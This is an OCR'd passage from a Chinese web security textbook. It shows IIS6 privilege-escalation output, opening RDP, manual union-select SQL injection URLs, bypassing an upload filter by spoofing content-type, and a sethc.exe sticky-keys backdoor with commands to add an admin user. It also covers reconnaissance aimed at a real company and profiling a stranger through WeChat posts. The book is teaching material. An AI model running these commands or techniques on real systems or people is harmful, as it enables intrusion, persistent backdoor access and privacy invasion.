<table><tr><td colspan="5">C:\Inetpub\wwwroot\s\&gt; netstat -ano</td></tr><tr><td colspan="5">Active Connections</td></tr><tr><td>Proto</td><td>Local Address</td><td>Foreign Address</td><td>State</td><td>PID</td></tr><tr><td>TCP</td><td>0.0.0.0:80</td><td>0.0.0.0:0</td><td>LISTENING</td><td>4</td></tr><tr><td>TCP</td><td>0.0.0.0:135</td><td>0.0.0.0:0</td><td>LISTENING</td><td>672</td></tr><tr><td>TCP</td><td>0.0.0.0:445</td><td>0.0.0.0:0</td><td>LISTENING</td><td>4</td></tr><tr><td>TCP</td><td>0.0.0.0:1025</td><td>0.0.0.0:0</td><td>LISTENING</td><td>396</td></tr><tr><td>TCP</td><td>0.0.0.0:1026</td><td>0.0.0.0:0</td><td>LISTENING</td><td>1004</td></tr><tr><td>TCP</td><td>192.168.60.132:80</td><td>192.168.60.128:52405</td><td>ESTABLISHED</td><td>4</td></tr><tr><td>TCP</td><td>192.168.60.132:80</td><td>192.168.60.128:52431</td><td>ESTABLISHED</td><td>4</td></tr><tr><td>TCP</td><td>192.168.60.132:139</td><td>0.0.0.0:0</td><td>LISTENING</td><td>4</td></tr><tr><td>TCP</td><td>192.168.60.132:1175</td><td>204.79.197.200:80</td><td>ESTABLISHED</td><td>2300</td></tr><tr><td>UDP</td><td>0.0.0.0:445</td><td>*:*</td><td></td><td>4</td></tr><tr><td>UDP</td><td>0.0.0.0:500</td><td>*:*</td><td></td><td>396</td></tr><tr><td>UDP</td><td>0.0.0.0:1027</td><td>*:*</td><td></td><td>732</td></tr><tr><td>UDP</td><td>0.0.0.0:1028</td><td>*:*</td><td></td><td>732</td></tr><tr><td>UDP</td><td>0.0.0.0:4500</td><td>*:*</td><td></td><td>396</td></tr><tr><td>UDP</td><td>127.0.0.1:123</td><td>*:*</td><td></td><td>768</td></tr><tr><td>UDP</td><td>192.168.60.132:123</td><td>*:*</td><td></td><td>768</td></tr><tr><td>UDP</td><td>192.168.60.132:137</td><td>*:*</td><td></td><td>4</td></tr><tr><td>UDP</td><td>192.168.60.132:138</td><td>*:*</td><td></td><td>4</td></tr></table>


图 13-21 查看 3389 端口是否开放


发现并没有开启 3389, 可上传一个批处理文件使服务器自动开启 3389 端口, 如图 13-22 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0153_f59bd10c18f6.jpg)



图 13-22 批处理开启 3389 端口



再看一下是否开启 3389 成功，由图 13-23 所示可发现成功开启了 3389 端口。


<table><tr><td colspan="5">C:\Inetpub\wwwroot\s\&gt; C:\inetpub\wwwroot\s\iis6.exe &quot;netstat -ano&quot; 
[IIS6Up]--&gt;IIS Token PipeAdmin goldsTn Version 
[IIS6Up]--&gt;This exploit gives you a Local System shell 
[IIS6Up]--&gt;Set registry OK 
[process walking]: 280 cmd.exe 
[process walking]: 3816 wmiprvse.exe 
[IIS6Up]--&gt;Got WMI process Pid: 3816 
[Try 1 time...] 
[IIS6Up]--&gt;Found token SYSTEM 
[*]Running command with SYSTEM Token... 
[*]Command: netstat -ano 
[+]Done, command should have ran as SYSTEM!</td></tr><tr><td colspan="5">Active Connections</td></tr><tr><td>Proto</td><td>Local Address</td><td>Foreign Address</td><td>State</td><td>PID</td></tr><tr><td>TCP</td><td>0.0.0.0:80</td><td>0.0.0.0:0</td><td>LISTENING</td><td>4</td></tr><tr><td>TCP</td><td>0.0.0.0:135</td><td>0.0.0.0:0</td><td>LISTENING</td><td>672</td></tr><tr><td>TCP</td><td>0.0.0.0:445</td><td>0.0.0.0:0</td><td>LISTENING</td><td>4</td></tr><tr><td>TCP</td><td>0.0.0.0:1025</td><td>0.0.0.0:0</td><td>LISTENING</td><td>396</td></tr><tr><td>TCP</td><td>0.0.0.0:1026</td><td>0.0.0.0:0</td><td>LISTENING</td><td>1004</td></tr><tr><td>TCP</td><td>0.0.0.0:3389</td><td>0.0.0.0:0</td><td>LISTENING</td><td>1696</td></tr><tr><td>TCP</td><td>192.168.60.132:139</td><td>192.168.60.128:52501</td><td>ESTABLISHED</td><td>4</td></tr><tr><td>TCP</td><td>192.168.60.132:139</td><td>0.0.0.0:0</td><td>LISTENING</td><td>4</td></tr><tr><td>TCP</td><td>192.168.60.132:1179</td><td>204.79.197.200:80</td><td>ESTABLISHED</td><td>2300</td></tr><tr><td>TCP</td><td>192.168.60.132:1182</td><td>2479.197.200:80</td><td>ESTABLISHED</td><td>2300</td></tr><tr><td>UDF</td><td>0.0.0.0:445</td><td>*:*</td><td></td><td>4</td></tr></table>


图 13-23 成功开启 3389 端口


连接 3389 端口，成功登录服务器，如图 13-24 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0154_da6c789cae16.jpg)



图 13-24 连接 3389 后成功登录服务器


本次只是一个简单的本地溢出提权，但在实际生活中不会如此简单。

## 13.2 实战操作

本节介绍 Windows 简单的创建账户及提升到管理员权限的操作。对 Linux 感兴趣的读者可以深入学习，实际中 Linux 提权是最简单的，希望读者务必掌握。

测试地址：127.0.0.1/dedecmsgbk。

WebShell 地址：127.0.0.1/dedecmsgbk/webshell2.php。

测试流程:

第一步：打开“中国菜刀”，添加 WebShell 到“中国菜刀”。

第二步：单击文件管理查看是否可以正常管理所获取权限的网站。

第三步：打开虚拟终端，执行系统命令，获取敏感信息。

第四步：远程连接 3389 端口。

具体操作见视频 13-1 和视频 13-2。

## 第4篇

## Web 安全实战演练

# 段击全过程

## 14.1 信息搜集

发一起攻击，很简单，难的是确保这次攻击成功。正所谓“磨刀不误砍柴工”，信息收集相对于攻击，就好比“磨刀”相对于“砍柴”。

本节实战以国内某互联网巨头为例，介绍信息收集的方法及过程，从案例中看信息收集在整个渗透攻击中的重要性。

首先查询网站的 whois。访问 http://whois.chinaz.com 网站即可以查询到，如图 14-1 所示。

<table><tr><td colspan="2">域名.com 的注册信息 ②</td></tr><tr><td colspan="2">以下信息获取时间：2016-08-02 15:23:17 受收发新信息</td></tr><tr><td>所有者
Registrant Name</td><td>Beijing Science Technology Co., Ltd.</td></tr><tr><td>所有者联至邮箱
Registrant E-mail</td><td>domainmaster@baidu.com</td></tr><tr><td>注册商
Sponsoring Registrar</td><td>MARKMONITOR INC.</td></tr><tr><td>注册日期
Registration Date(EDT)</td><td>1999年10月11日</td></tr><tr><td>到期日期
Expiration Date(EDT)</td><td>2017年10月11日</td></tr><tr><td></td><td>2017年10月11日前，域名可正常使用。请在2017年10月11日前及时续延期。</td></tr><tr><td>域名状态
Domain Status</td><td>注册商设置禁止删除(clientDeleteProhibited) ⑦
https://icann.org/epp#clientDeleteProhibited
注册商设置禁止转移(clientTransferProhibited) ②</td></tr></table>


图 14-1 whois 查询


根据查询信息，可获取注册公司的邮箱、地址、相关日期，如图 14-2 所示。

<table><tr><td>详细英文注册信息如下</td><td>专用词汇英/中文对</td></tr><tr><td colspan="2">Domain Name: com
Registry Domain ID: 11181110_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.markmonitor.com
Registrar URL: http://www.markmonitor.com
Updated Date: 2015-09-10T02:04:54-0700
Creation Date: 1999-10-11T04:05:17-0700
Registrar Registration Expiration Date: 2017-10-11T00:00:00-0700
Registrar: MarkMonitor, Inc.
Registrar IAMA ID: 292
Registrar Abuse Contact Email: abusecomplaints@markmonitor.com
Registrar Abuse Context Phone: +1.2083895740
Domain Status: clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)
Domain Status: clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)
Domain Status: clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)
Domain Status: serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)</td></tr></table>


图 14-2 whois 查询获取信息



有人不禁要问，收集这些信息有什么用呢？这些信息和渗透攻击其实很可能有大关联性。如后台的账号有可能是邮箱号，密码找回需使用的手机是查询到的电话号码。ftp 的爆破用的账号密码也可能就在其中。这就涉及博大精深的社会工程学了，信息越多，入侵的机会也越多。



接着，获取网站的 ip，可以通过打开计算机中的 cmd，用 Ping 命令探测网站的 ip，如图 14-3 所示。


<table><tr><td>C:\Users\xxy&gt;ping www.1.com</td></tr><tr><td>正在 Ping www.a.shifen.com [61.135.169.] 具有 32 字节的数据:</td></tr><tr><td>来自 61.135.169.125 的回复：字节=32 时间=1ms TTL=55</td></tr><tr><td>来自 61.135.169.125 的回复：字节=32 时间=1ms TTL=55</td></tr><tr><td>来自 61.135.169.125 的回复：字节=32 时间=1ms TTL=55</td></tr><tr><td>来自 61.135.169.125 的回复：字节=32 时间=1ms TTL = 55</td></tr><tr><td>61.135.169.125 的 Ping 统计信息:</td></tr><tr><td>数据包：已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失),往返行程的估计时间(以毫秒为单位):</td></tr><tr><td>最短 = 1ms,最长 = 1ms,平均 = 1ms</td></tr><tr><td>C:\Users\xxy&gt;</td></tr></table>


图14-3 查看域名ip


但是对于数据访问量大或者安全意识高的网站，仅仅用 Ping 命令是不够的。

不同地区的主机对同一网站 Ping，却显示不同的 ip，如图 14-4 所示。这里不需要了解太多，只要知道网站做了 CDN（Content Delivery Network），很可能还有云 WAF（Web Application Firewall）。

<table><tr><td>广东广州[电信]</td><td>14.215.177.37</td><td>广东省广州市 北京百度网讯科技有限公司电信节点</td><td>6ms</td><td>53</td></tr><tr><td>云南昆明[电信]</td><td>14.215.177.38</td><td>广东省广州市 北京百度网讯科技有限公司电信节点</td><td>39ms</td><td>55</td></tr><tr><td>河北秦皇岛[电信]</td><td>220.181.112.244</td><td>北京市 北京百度网讯科技有限公司电信节点</td><td>20ms</td><td>54</td></tr><tr><td>江苏泰州[电信]</td><td>180.97.33.107</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>7ms</td><td>54</td></tr><tr><td>广东东莞[电信]</td><td>14.215.177.37</td><td>广东省广州市 北京百度网讯科技有限公司电信节点</td><td>超时</td><td>超时</td></tr><tr><td>贵州兴义[电信]</td><td>180.97.33.107</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>61ms</td><td>51</td></tr><tr><td>广东惠州[电信]</td><td>14.215.177.37</td><td>广东省广州市 北京百度网讯科技有限公司电信节点</td><td>超时</td><td>超时</td></tr><tr><td>江苏镇江[电信]</td><td>160.97.33.107</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>3ms</td><td>55</td></tr><tr><td>江苏扬州[电信]</td><td>180.97.33.108</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>4ms</td><td>55</td></tr><tr><td>广东佛山[电信]</td><td>14.215.177.38</td><td>广东省广州市 北京百度网讯科技有限公司电信节点</td><td>超时</td><td>超时</td></tr><tr><td>浙江绍兴[电信]</td><td>115.239.210.27</td><td>浙江省杭州市 北京百度网讯科技有限公司电信节点</td><td>5ms</td><td>52</td></tr><tr><td>湖北仙桃市[电信]</td><td>180.97.33.108</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>24ms</td><td>55</td></tr><tr><td>湖南衡阳[电信]</td><td>14.215.177.37</td><td>广东省广州市 北京百度网讯科技有限公司电信节点</td><td>25ms</td><td>54</td></tr><tr><td>陕西西安[电信]</td><td>180.97.33.107</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>43ms</td><td>54</td></tr><tr><td>江苏常州[电信]</td><td>180.97.33.107</td><td>江苏省南京市 北京百度网讯科技有限公司电信节点</td><td>9ms</td><td>55</td></tr></table>


图 14-4 不同地区主机对同一网站 Ping 结果



由于目前趋势，CDN 使用较多，以后遇到的概率也大。所以这里介绍如何查找网站真实 ip。



国内 CDN，可能只针对国内的网络，利用国外主机 Ping，可能可以找到。此外，可以查找网站 ip 的历史记录，在历史记录中可能有真实 ip。如图 14-5 所示是某网站历史 ip（笔者介绍 http://toolbar.netcraft.com，可查询网站历史 ip）。


<table><tr><td colspan="5">■ Hosting History</td></tr><tr><td>Netblock owner</td><td>IP address</td><td>OS</td><td>Web server</td><td>Last seen</td></tr><tr><td>Rooms 2201-03, 22/F, World Wide House 19 Des Voeux Road Central Hong Kong</td><td>103.235.46.</td><td>unknown</td><td>bfe/1.0.8.14</td><td>1-Aug-2016</td></tr><tr><td>Rooms 2201-03, 22/F, World Wide House 19 Des Voeux Road Central Hong Kong</td><td>103.235.46.</td><td>unknown</td><td>BWS/1.1</td><td>1-Aug-2016</td></tr><tr><td>Rooms 2201-03, 22/F, World Wide House 19 Des Voeux Road Central Hong Kong</td><td>103.235.46.</td><td>unknown</td><td>bfe/1.0.8.14</td><td>31-Jul-2016</td></tr><tr><td>CHINANET-ZJ Hangzhou node network Zhejiang Telecom</td><td>115.239.210.</td><td>unknown</td><td>bfe/1.0.6.14</td><td>28-Jul-2016</td></tr><tr><td>Rooms 2201-03, 22/F, World Wide House 19 Des Voeux Road Central Hong Kong</td><td>103.235.46.</td><td>unknown</td><td>BWS/1.1</td><td>27-Jul-2016</td></tr><tr><td>Rooms 2201-03, 22/F, World Wide House 19 Des Voeux Road Central Hong Kong</td><td>103.235.46.</td><td>unknown</td><td>bfe/1.0.8.14</td><td>26-Jul-2016</td></tr><tr><td>Rooms 2201-03, 22/F, World Wide House 19 Des Voeux Road Central Hong Kong</td><td>103.235.46.</td><td>unknown</td><td>BWS/1.1</td><td>25-Jul-2016</td></tr></table>


图 14-5 ip 历史记录


有时网站中可以注册会员，会发送验证邮件，通过邮件也可以获取真实 ip。获得了真实 ip 就可以轻松绕过云 WAF。渗透之路会变得更加简单。

## 14.2 漏洞扫描

本节介绍漏洞扫描工具 WVS 的使用，通过实战演示一种进阶的方法——带 cookies 扫描网站。

当扫描选项跳到 login 时，选中如图 14-6 所示的选项。

![image](MinerU_markdown_Web安全基础教程_assets/image_0155_23b0a4d52444.jpg)



图 14-6 登录设置


在登录界面输入账号和密码，如图 14-7 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0156_04babbf9d01c.jpg)



图 14-7 输入账号和密码


模拟登录后，选择需要保存的文件，如图 14-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0157_6e41e1aafc91.jpg)



图14-8 选择保存的文件


完成这些步骤后，扫描网站相当于用登录后的身份在扫描。有些漏洞需要在登录后才能扫描出来。

## 14.3 手工测试

本节介绍 SQL 手工注入，对于初学者可能稍有难度，但也是最有意思的内容。

这次以手工注入 Access 数据库为例。图书馆就好比一个数据库。图书馆里的每一个书架就是一个 database，书架上放满了书，每一本书就是 table。而书本里印的字就是数据。

如表 14-1 所示为一张数据库表名为 admin_tb 表的结构示意图。


表 14-1 数据库表


<table><tr><td>id</td><td>username</td><td>password</td></tr><tr><td>1</td><td>admin</td><td>Admin888</td></tr><tr><td>2</td><td>test</td><td>Test123</td></tr></table>

查询数据库需要执行 sql 语句:

```txt
select username from admin_tb where id=1 // 查询 id=1 的用户名
```

返回的结果就是 admin。select 是选择的意思，from 可以理解为从哪里取数据，where 表示需要满足什么条件的数据。这句话的意思可以这么理解：从 admin_tb 表中把满足 id=1 条件的列，名为 username 的值查询出来。

如图 14-9 所示，即查询出 username 为 admin 的值。

<table><tr><td>id</td><td>username</td><td>password</td></tr><tr><td>1</td><td>admin</td><td>Admin888</td></tr><tr><td>2</td><td>test</td><td>Test123</td></tr></table>


图 14-9 admin_tb 表


先本地搭建一套有漏洞的系统。用它可以很直观的注入一个 Web 系统。

使用工具注入，如图 14-10 所示，已经显示出后台的账号密码了。接下来试试如何手工注入。

![image](MinerU_markdown_Web安全基础教程_assets/image_0158_f277e2614a81.jpg)



图 14-10 使用工具注入


数据库的表是 admin，保存用户的列是 username，保存密码的列是 password。那么可以通过构造 SQL 语句来查询想要的信息。

这里还需要介绍一下联合查询，联合查询简单解释就是同时进行两次查询。使用关键字 union 来连接。例如，单独查询账号：select username from admin。单独查询密码：select password from admin。而现在假设要查询密码，账号不查询，这时可使用 and 1=2 来屏蔽掉查询账号的语句。之后再使用联合查询：select username from admin and 1=2 union select password from admin。这条语句就等于是仅仅把 admin 表中的密码列查询出来。

在 http://127.0.0.1/price.asp?id=45 地址后面加上 and 1=2，页面返回错误，如图 14-11 所示。1 不等于 2，为假，假是空集，所以也等于是把这次系统本身的查询给“屏蔽”了（图片中 20% 表示空格，为 url 编码）。

![image](MinerU_markdown_Web安全基础教程_assets/image_0159_ef51016d7094.jpg)



图 14-11 返回错误页面


在 http://127.0.0.1/price.asp?id=45 地址后面加上 and 1=1，返回结果如图 14-12 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0160_aa2397d3828b.jpg)



图14-12 返回正常页面


返回的结果和不加任何字符的正常页面一样。因为 and 1=1 中，1 是等于 1 的，为真。起不到“屏蔽”作用。

使用 union 查询。

在浏览器中输入:

```txt
http://127.0.0.1/price.asp?id=45and1=2unionselect1fromadmin 
```

返回结果如图 14-13 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0161_ea2100366067.jpg)



图 14-13 union 查询


还是错误页面,为什么呢?因为 and 1=2 把网站后台自身的那句 SQL 查询给屏蔽掉了。也就是第一句是不能出结果的。而后面的 select 1 from admin 为什么不把列名为 1 的列中的数据给查询出来呢?因为 admin 表中,并没有列名为 1 的列,而且系统处理时,这里并不把 1 当作列名,而是把 1 当作常量,可以这么理解,这里 1 就是 1,就当作普通的 1。

union 查询时还有一个语法，就是 select id, title from news union select username, password from admin, 其中 select id, title from news 查询 id 和 title 中的 2 个列。那后面 select username, password from admin, 也必须满足类型和数量相同。简单的说前面 2 个后面也要 2 个。那系统后台查询有几个列名呢？先尝试 http://127.0.0.1/price.asp?id=45and1=2unionselect1,2 fromadmin, 如图 14-14 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0162_0586bca64f61.jpg)



图 14-14 union 查询


还是错误，于是接着尝试，直到输入 8，返回如图 14-15 所示页面。

```txt
http://127.0.0.1/price.asp?id=45and1=2unionselect1,2,3,4,5,6,7,8fromadmin 
```

![image](MinerU_markdown_Web安全基础教程_assets/image_0163_f38c5de26593.jpg)



图 14-15 union 查询


这里出现了一个数字 3。也就是这条语句构造是正确的，出结果了。而页面输出这里正好在这个位置把常量 3 显示出来了。

若把 SQL 查询语句中的 3 替换成 username，这个列名会出现什么结果呢？如图 14-16 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0164_4c6ad2876108.jpg)



图 14-16 查询 username


正如猜想的一样，管理员的账号查询出来。同理，替换为 password，管理员的密码也会查出来，如图 14-17 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0165_c793f4862cb8.jpg)



图 14-17 查询 password


图中结果和工具注入得到的结果是一样的。MD5 密文可以到 www.cmd5.com 网站上去破解。

## 14.4 漏洞利用及 GetShell

拿到管理账号密码，进后台一般可以查找网站上传点，尝试上传木马。

直接上传.php 或者.asp 或者.jsp 之类的后缀时，一般会不成功。直接上传木马，页面提示结果如图 14-18 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0166_bd49f75b4154.jpg)



图 14-18 上传木马


这些验证图片的方式，可能也是存在绕过的地方。笔者搭建的系统是通过抓包后修改content-type 属性的方式，把其值设置成 image/jpeg，如图 14-19 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0167_a0e7fc89dd88.jpg)



图 14-19 修改 content-type 属性


服务端这种验证方式是通过验证上传类型来识别的。上传包是可以随意修改的，从而达到了欺骗的目的。

上传方式验证的绕过方法其实还有很多，本地 JavaScript 校验抓包通过改扩展名就能绕过。图片内容检测加入类似 gif89a 之类的字符可绕过，以及截断上传，上传表单中有可控的允许上传的扩展名或路径等。美丽的谎言虽然美丽，但它总是谎言。总之，凡是客户端提交过来的数据，都是不可信任的。

## 14.5 提权

在许多武侠小说中，各位江湖侠客都希望有一把可以依仗的神兵利器。而其实真正的高手，并不在乎用什么武器。他们以意导气，手中寸草也是利器，剑气便可杀人于千里之外。提权其实未必一定要有非常厉害的 0day。收集信息后，因地制宜，就地取材。

提权一般在拿到 WebShell，网站的管理权限后提升权限，扩展到整个服务器的权限。这里提升权限的操作系统是 Windows 。思路就是添加系统权限账号，通过远程服务或者 telnet 等方式连接上去。获取服务器权限。

通过 WebShell 上传各种 exp，上传成功却找不到。

通过 tasklist /svc 命令查看服务器有杀毒软件，exp 可能被杀毒软件删除，如图 14-20 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0168_0b930091bddf.jpg)



图 14-20 执行系统命令


这时执行 whoami 命令发现，WebShell 权限已经是 system 权限了，如图 14-21 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0169_3cb374c8ab30.jpg)



图 14-21 执行系统命令


于是尝试添加一个叫作 j1ng 的账号，如图 14-22 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0170_06fcae97176a.jpg)



图 14-22 添加用户


发现没有回显，账号也没有添加成功。连续快速按 5 下 Shift 键，会弹出一个弹窗。若使用远程服务连接，按 5 下服务器也会弹出小窗口。若弹出的不是粘滞键，还是一个系统级别的 shell--cmd.exe，就可以通过未登录状态为自己添加用户了。

执行命令：

```batch
del c:\windows\system32\sethc.exe
copyc:\windows\system32\cmd.exe c:\windows\system32\sethc.exe 
```

两条命令成功执行，如图 14-23 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0171_9f4a0217265c.jpg)



图 14-23 执行命令


在远程服务登录界面按下 5 次 shift 键，弹出 cmd 对话框，如图 14-24 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0172_1d0a2c58eed1.jpg)



图 14-24 登录页面


输入添加账号命令 net user j1ng admin /add，将 j1ng 账号添加到管理组 net localgroup administrator j1ng /add，如图 14-25 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0173_b24bd313c93b.jpg)



图 14-25 添加账号到管理组


远程服务连接成功登录，如图 14-26 所示，绕开了防火墙限制，成功达到目的。

![image](MinerU_markdown_Web安全基础教程_assets/image_0174_99e913aacafb.jpg)



图 14-26 远程服务连接成功


如图 14-27 所示为攻击过程的流程图，帮助读者巩固和梳理这章的知识点。

详细的攻击流程请大家关注第 14 章视频 14-1。

渗透方面涵盖的知识面广，是一个需要长时间的循序渐进的过程。胜不骄，败不馁，坚持不懈，有这样的学习态度肯定能学好。

![image](MinerU_markdown_Web安全基础教程_assets/image_0175_a724ffa8b422.jpg)



图 14-27 攻击流程图


## 第5篇

## 日常安全意识

# 社会工程学

什么是社会工程学？

社会工程在很大程度上被人们误解了，从而导致人们对其定义和工作方式有很多不同的观点。有人简单的将社会工程视为撒谎，可以骗取免费的披萨；有人将其归类为罪犯或者骗子的工具；也有人将其划到科学的范畴，认为其理论可以分门别类或采用数学公式加以研究；还有人将其视为长久失传的神秘技艺，掌握了社会工程学，从业者就能像魔术师那样制造强大的思维错觉。

那么到底什么是社会工程？维基百科的定义：“操纵他人采取特定行动或者泄露机密信息的行为。它与骗局或者欺骗类似，故该词常用于指代欺诈或者诈骗，以达到收集信息、欺诈和访问计算机系统的目的，大部分情况下攻击者与受害者不会有面对面的接触。”

社会工程学是一门艺术，或者说是一门科学，它有技巧地操纵人们在生活中的某些方面采取某种行动。社会工程人员使用的很多技巧或方法都来源于其他领域，其中一个典型的例子就是销售。销售人员往往很健谈、随和，而且非常善于收集别人的信息。

## 15.1 信息搜集

战争的胜利百分之九十取决于情报。

——拿破仑·波拿巴

人们常说，没有什么信息是不相关的。这句话放在这里完全适用。即使最微小的细节也能促成社会工程人员的成功入侵。

在多如牛毛的社交网站上，人们可以轻易地与其所选的人分享自己生活的方方面面，这使潜在的破坏性信息比任何时候都多。

## 1. 收集信息

收集信息就如同盖房子一般。若想从房顶盖起，则必败无疑。一栋坚固的房子必定是在打下坚实的基础后，从地面往上盖的。收集信息时不要总想着怎么组织和运用这些数据，创建一个文件或信息收集服务来收集信息才是当务之急。

事实上，有很多工具可以收集和运用这些数据。国内一些软件也可用于收集信息，如有道云笔记，该软件类似于 Windows 系统中的 TXT 文本编辑器，但较 TXT 强大的地方是该软件能够直接复制图片等。同时手机客户端都可以同步数据，对于社会工程人员来说算是较为便利的一款软件。如图 15-1 和图 15-2 所示分别是该软件的 PC 端和手机端界面。

![image](MinerU_markdown_Web安全基础教程_assets/image_0176_fe484722808f.jpg)



图 15-1 PC 端


<table><tr><td>FTP配置</td></tr><tr><td># Example config file /etc/vsftpd/vsftpd.conf
# The default compiled in settings are fairly paranoid. This sample file
# loosens things up a bit, to make the ftp daemon more usable.
# Please see vsftpd.conf.5 for all compiled in defaults.
#
# READ THIS: This example file is NOT an exhaustive list of vsftpd options.
# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd&#x27;s
# capabilities.
#
# Allow anonymous FTP? (Beware - allowed by default if you comment this out).
#anonymous_enable=YES
#
# Uncomment this to allow local users to log in.
local_enable=YES
#
# Uncomment this to enable any form of FTP write</td></tr><tr><td>加星 移动 加密 阅读模式 更多</td></tr></table>


图 15-2 手机端


信息收集的关键一步是要转换自己的思维方式。在信息大爆炸的世界，必须改变平常的思维方式，学会质疑一切，看到信息就按照社会工程人员的思维来思考。利于网络等进行搜索的方式要改变，对于网页返回的信息，也要学会从社会工程的角度去思考、审视。无意中听到的谈话、论坛上看似无聊的帖子，抑或是一袋垃圾，都应该以不同的方式来对待。

## 2. 信息源

信息存在多种不同的来源。

从网上搜集信息，公司或者个人网站是信息的重要来源；看别人的个人网站（空间、朋友圈、微博等）可了解他们的日常生活：孩子、房子、工作等；同一个企业的员工往往会登录相同的论坛，或有着类似的兴趣，甚至会上相同的几个社交网站。若在新浪微博中找到××公司的一名员工，很有可能发现他的好几个同事也在其中。收集这些数据，可以更清楚地分析这家公司以及它的员工。很多员工在社交网站上用标签的形式展示自己的职位，这可以令社会工程人员勾勒出公司某个部门的规模以及组织架构。

网上收集信息有许多途径。

## ○ 搜索引擎

谷歌、百度等搜索引擎都存在高级搜索语法，善用搜索语法可以快速、准确地找到自己想要的内容，常用的搜索关键字在本书第3章中详细介绍。

## ○ Whois 域名信息查询

Whois 能提供域名数据库查询服务，如图 15-3 所示。Whois 数据库中有很多有价值的信息，有时候甚至包含网站管理员的完整联系方式、服务器信息，这些信息都可用于进一步收集或者发动攻击。

<table><tr><td>whois查询</td><td>邮箱反查</td><td>注册人反查</td><td>域名批量反查</td></tr><tr><td></td><td></td><td></td><td>baidu.com</td></tr><tr><td colspan="4">域名 baidu.com 的信息 以下信息更新时间：2016-07-20 17:49:42 立即更新</td></tr><tr><td></td><td>域名</td><td colspan="2">baidu.com [whois 反查]</td></tr><tr><td></td><td></td><td>其他常用域名后缀查询： cn</td><td>com cc net org</td></tr><tr><td></td><td>注册商</td><td colspan="2">BEIJING INNOVATIVE LINKAGE TECHNOLOGY LTD. DBA DNS.COM.CN</td></tr><tr><td></td><td>联系人</td><td colspan="2">zhiyong duan [whois反查]</td></tr><tr><td></td><td>联系方式</td><td colspan="2">domainmaster@baidu.com [whois反查]</td></tr><tr><td></td><td>更新时间</td><td colspan="2">2015年09月10日</td></tr><tr><td></td><td>创建时间</td><td colspan="2">1999年10月11日</td></tr><tr><td></td><td>过期时间</td><td colspan="2">2017年10月11日</td></tr><tr><td></td><td>域名服务器</td><td colspan="2">whois.markmonitor.com</td></tr></table>


图15-3 域名查询


## ○ 社交媒体

不同种类的信息有助于全面了解目标。用户喜欢在个人社交媒体分享自己的地理位置、和谁在一起以及正在做的事情等。像朋友圈这种用来分享个人照片、故事和其他相关信息的社交网络，是社会工程人员特别喜欢的信息源。只需片刻工夫，目标人物的住址、工作、照片、兴趣等信息就呈现在眼前了。

## 3. 预防和补救

## ○ 学会识别社会工程攻击

防御和减轻社会工程攻击的第一步是了解攻击。知道通过什么迹象来判断是否有人在欺骗你，这样才能保护自己，需要了解威胁以及运用威胁的手段。

## ○ 创建具有个人安全意识的文化

安全意识不是员工的个人意识。在安全实践中和一些同事或朋友聊起对待攻击的看法时态度常常是：“这些又不是我的数据，我担心什么？”这些态度表明了公司想要灌输安全意识却没能切中要害，没有引起重视，没起到作用，最重要的是，没有与个人挂钩。

## - 充分认识信息的价值

现实生活中经常有人认为有些信息是无用的或者价值很小，并不会去付出精力去保护这些信息。这一点正是社会工程人员非常喜欢的，社会工程人员经常会贬低某些数据的价值来得到这些数据。尤其是在当今大数据时代，大量的无用或者利用价值很低的数据堆积在一块就能分析出一些价值很高的数据。社会工程人员经常用天气、工作以及产品等话题套近乎，然后挖掘想要的信息。

## - 及时更新软件

大多数企业都必须向公众和客户发布一些信息。目前很多公司还在使用 IE6 和 Adobe Acrobat 8 等漏洞比较多的低版本的软件。若黑客知道该公司用的相关软件是漏洞比较多的版本，就可以利用漏洞发起恶意攻击，连 IDS、防火墙以及杀毒软件都无法阻挡。有效的防御措施就是升级软件。软件的最新版本通常修补了其安全漏洞。

## ○ 编制参考指南

若某人声称自己是 CEO 的助理，要求提供××系统的账号和密码，该如何应对？若某人没有预约但外表和行为看上去很像供应商，他要求进入公司大楼或其他地方时，该怎么处理？若某人打电话声称自己是来自管理承办公司，要求你提供一些信息或者内部数据，可以按下列步骤操作。

① 询问来电者的员工号和姓名，在得到反馈前不要回到任何问题。

② 获取身份信息后，询问他需要这些信息的项目号。

③ 若①和②的问题都能对答如流，就可以提供他需要的信息。若答不上来，就要求他的上司或者他发一份邮件抄送给相关领导获得授权。

类似这样的简单参考指南可以帮助个人明白在考验其安全意识的情况下该说什么以及该做什么。

## 15.2 实战操作

本节通过当前最为流行的微信朋友圈，去搜集一个陌生人的信息。

很多人都会在朋友圈去分享一些生活动态，晒自己一次旅行等。这些在不经意间就泄露了自己的某些信息。如图 15-4 所示，通过一个微信上的普通好友朋友圈，来分析和整理这个人的一些信息。

通过图 15-5～图 15-7 所示的 3 张其朋友圈截图能分析出其如下相关信息。

职业：学生，学校：山东师范大学，并且有这个人的相关照片，可初步分析出这个人的兴趣爱好：美食和旅行。

